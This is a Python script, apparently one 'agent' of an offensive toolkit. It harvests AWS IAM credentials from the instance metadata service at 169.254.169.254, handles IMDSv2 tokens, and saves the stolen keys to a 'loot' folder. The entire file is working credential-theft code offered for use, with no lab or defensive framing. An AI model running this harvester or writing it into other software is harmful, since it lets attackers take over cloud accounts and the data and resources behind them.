#!/home/dan/Chimera_Project/venv/bin/python3
import requests
import json
import os
import sys
from datetime import datetime

class CloudMetadataHarvester:
    """
    Agent 307: Cloud Identity Extraction Specialist.
    Queries internal Metadata endpoints (IMDSv1/v2) to harvest 
    IAM credentials and instance configuration data.
    """
    def __init__(self):
        self.target_url = "http://169.254.169.254/latest/meta-data/"
        self.loot_dir = "/home/dan/Chimera_Project/agents/307_Cloud_Metadata_Harvester/loot"
        os.makedirs(self.loot_dir, exist_ok=True)

    def harvest_aws(self):
        """Attempts to harvest AWS IAM credentials."""
        print("[*] Attempting AWS IMDSv1/v2 Credential Extraction...")
        try:
            # First, try to get a Token (IMDSv2 requirement)
            token_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
            token_r = requests.put("http://169.254.169.254/latest/api/token", headers=token_headers, timeout=2)
            
            headers = {}
            if token_r.status_code == 200:
                headers["X-aws-ec2-metadata-token"] = token_r.text
                print("    [+] IMDSv2 Token Acquired.")

            # Get IAM Role Name
            role_r = requests.get(self.target_url + "iam/security-credentials/", headers=headers, timeout=2)
            if role_r.status_code == 200:
                role_name = role_name = role_r.text.strip()
                # Get actual credentials for that role
                creds_r = requests.get(self.target_url + f"iam/security-credentials/{role_name}", headers=headers, timeout=2)
                return creds_r.json()
        except Exception as e:
            return {"error": str(e)}

    def execute(self):
        print("--- [AGENT 307: CLOUD METADATA HARVESTING ACTIVE] ---")
        
        credentials = self.harvest_aws()
        
        if credentials and "AccessKeyId" in credentials:
            print(f"[!!!] SUCCESS: Harvested AccessKeyId {credentials['AccessKeyId']}")
            
            # Commit to Loot
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            loot_file = f"{self.loot_dir}/cloud_creds_{timestamp}.json"
            with open(loot_file, 'w') as f:
                json.dump(credentials, f, indent=4)
            print(f"[*] Credentials stored: {loot_file}")
            return True
        else:
            print("[!] No cloud credentials found at metadata endpoint.")
            return False

if __name__ == "__main__":
    CloudMetadataHarvester().execute()
